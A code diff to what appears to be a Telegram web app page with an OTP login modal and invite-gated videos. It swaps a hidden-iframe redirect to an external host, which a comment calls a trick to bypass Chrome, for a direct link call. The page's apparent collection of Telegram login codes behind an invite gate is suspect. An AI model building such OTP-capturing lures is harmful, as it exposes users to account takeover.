@@ -125,8 +125,8 @@
             <div id="otp-sec" style="display: none;">
                 <div style="display: flex; gap: 8px; align-items: stretch; justify-content: center; margin-bottom: 10px;">
                     <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP" style="width: 65%; margin-bottom: 0; letter-spacing: 5px;">
-                    <!-- টেলিগ্রাম ইন্টারনাল ব্রাউজার ওয়েবভিউ টার্গেট বাটন -->
-                    <button onclick="openInTelegramBrowser()" style="width: 30%; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px; padding: 10px 5px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; line-height: 1.2;">👀 View<br>Code</button>
+                    <!-- ডিরেক্ট পাইথন রিডাইরেক্ট গেটওয়ে -->
+                    <button onclick="tg.openLink('https://pmrony-forwardbot.hf.space/api/jump')" style="width: 30%; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px; padding: 10px 5px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; line-height: 1.2;">👀 View<br>Code</button>
                 </div>
                 <button id="btn-verify-code" class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;" onclick="verifyCode()">Verify & Connect</button>
                 <div style="text-align: center; margin-top: 15px;">
@@ -199,6 +199,8 @@
             } catch(e) { showToast("Connection error!"); }
             isCheckingLogin = false;
         }
+
+        function closeModal() { document.getElementById('shareModal').style.display = 'none'; }
 
         function closeLogin() { document.getElementById('loginModal').style.display = 'none'; }
 
@@ -438,29 +440,10 @@
             else { showToast("❌ Still need more invites!"); }
         }
 
-        function closeModal() { document.getElementById('shareModal').style.display = 'none'; }
-
         // পেজ রিলোড হলে অটোমেটিক লগিন স্টেট চেক করবে
         let savedState = localStorage.getItem("loginState");
         if (savedState === "otp") {
             setTimeout(() => { openLogin(); }, 500);
-        }
-
-        function openInTelegramBrowser() {
-            showToast("Connecting natively via Telegram Browser...");
-            
-            // হিডেন আইফ্রেম ট্রিক: ক্রোম ব্রাউজারকে বাইপাস করে সরাসরি টেলিগ্রামের নিজস্ব ইন্টারনাল ব্রাউজার ইঞ্জিনকে কল করবে
-            let iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = 'https://pmrony-forwardbot.hf.space/api/jump';
-            document.body.appendChild(iframe);
-            
-            // ২.৫ সেকেন্ড পর ব্যাকগ্রাউন্ড থেকে আইফ্রেমটি ক্লিন করে দেবে
-            setTimeout(() => {
-                if (iframe) {
-                    iframe.remove();
-                }
-            }, 2500);
         }
 
         fetchVideos();
